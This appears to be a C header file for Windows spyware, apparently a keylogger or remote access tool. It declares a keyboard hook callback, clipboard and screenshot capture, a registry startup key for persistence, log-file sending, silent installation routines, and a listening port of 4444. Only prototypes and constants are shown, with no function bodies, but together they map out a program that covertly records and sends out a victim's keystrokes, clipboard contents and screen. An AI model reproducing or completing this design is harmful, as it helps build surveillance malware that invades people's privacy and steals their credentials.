#ifndef CONSTANTS_H_INCLUDED
#define CONSTANTS_H_INCLUDED

typedef int socklen_t;
#define PORT    4444
#define MAXDATASIZE 50000

#include <windows.h>

VOID WINAPI get_copy_paste(VOID);

void create_reg_startup_key(void);

void delete_reg_key(void);

void send_logfile(void);

void take_screenshot(void);

PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp);

void CreateBMPFile(HWND hwnd, LPCTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC);

void dispatch_function(void)__attribute__((noreturn));

void print_date_in_log(void);

__declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam);

void silent_installation_management(void)__attribute__((noreturn));

#endif


